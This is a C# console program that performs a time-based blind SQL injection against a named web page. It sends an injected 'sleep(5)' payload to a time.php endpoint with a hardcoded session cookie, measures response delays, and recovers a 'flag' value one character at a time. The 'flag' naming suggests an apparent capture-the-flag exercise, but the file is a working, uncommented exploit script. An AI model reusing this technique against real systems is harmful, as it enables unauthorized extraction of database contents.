using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace TimeBased
{
    class Program
    {
        static void Main(string[] args)
        {
            int d = 1;
            string found = "";
            string printed = "";
            List<string> banned = new List<string> { "25" };
            Stopwatch timer = new Stopwatch();
            while (true)
            {


                for (int i = 0; i <= 128; i++)
                {
                    
                    timer.Reset();
                    int value = Convert.ToInt32((char)i);
                    string convertedValue = $"{value:X}";
                    if (banned.Contains(convertedValue))
                    {
                        continue;
                    }
                    var url = "https://toronto.alwaysdata.net/member/web/time/time.php?id=1+and+if(ascii(substr(flag,"+d+",1))="+i+",sleep(5),0)#";

                    var httpRequest = (HttpWebRequest)WebRequest.Create(url);
                    httpRequest.Headers["Cookie"] = "PHPSESSID=8d1ee480fd1feca4136481b09afea185";
                    httpRequest.Headers["Content-Length"] = "0";

                    timer.Start();
                    
                    var httpResponse = (HttpWebResponse)httpRequest.GetResponse();
                    using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                    {
                        var result = streamReader.ReadToEnd();
                    }
                    timer.Stop();

                    if (timer.ElapsedMilliseconds < 5000)
                    {
                        Console.WriteLine("Error : " +  i);
                        continue;
                    }
                    else
                    {
                        d++;
                        printed += (char)i;
                        found += convertedValue;
                        Console.WriteLine(printed);
                        break;
                    }

                }
            }

        }


    }
}


